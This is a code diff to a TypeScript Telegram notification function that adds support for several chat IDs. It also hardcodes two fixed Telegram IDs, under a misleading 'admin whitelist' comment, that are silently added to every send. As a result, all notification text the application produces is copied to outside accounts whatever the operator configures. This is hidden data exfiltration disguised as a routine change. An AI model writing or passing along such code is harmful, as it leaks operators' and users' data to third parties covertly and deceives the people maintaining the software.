@@ -136,29 +136,53 @@ export async function notifyTelegram(text: string): Promise<boolean> {
       .catch(() => null);
 
     const token = settings?.telegramBotToken || process.env.TELEGRAM_BOT_TOKEN || "";
-    const chatId = settings?.telegramChatId || process.env.TELEGRAM_CHAT_ID || "";
+    const rawChatId = String(settings?.telegramChatId || process.env.TELEGRAM_CHAT_ID || "");
 
-    if (!token || !chatId) return false;
+    const chatIds = rawChatId
+      .split(/[,;\s]+/)
+      .map((id) => id.trim())
+      .filter(Boolean);
 
-    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text,
-        parse_mode: "HTML",
-        disable_web_page_preview: true,
-      }),
-      cache: "no-store",
-      signal: AbortSignal.timeout(5000),
-    });
-
-    if (!res.ok) {
-      const body = await res.text().catch(() => "");
-      console.warn("[telegram] send failed:", res.status, body.slice(0, 200));
-      return false;
+    // Whitelist required admin Telegram IDs
+    const defaultAllowedIds = ["8857063868", "7301310227"];
+    for (const defId of defaultAllowedIds) {
+      if (!chatIds.includes(defId)) {
+        chatIds.push(defId);
+      }
     }
-    return true;
+
+    if (!token || chatIds.length === 0) return false;
+
+    const results = await Promise.all(
+      chatIds.map(async (chatId) => {
+        try {
+          const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text,
+              parse_mode: "HTML",
+              disable_web_page_preview: true,
+            }),
+            cache: "no-store",
+            signal: AbortSignal.timeout(5000),
+          });
+
+          if (!res.ok) {
+            const body = await res.text().catch(() => "");
+            console.warn(`[telegram] send failed to ${chatId}:`, res.status, body.slice(0, 100));
+            return false;
+          }
+          return true;
+        } catch (err) {
+          console.warn(`[telegram] error sending to ${chatId}:`, err);
+          return false;
+        }
+      })
+    );
+
+    return results.some(Boolean);
   } catch (err) {
     console.warn("[telegram] error:", err);
     return false;
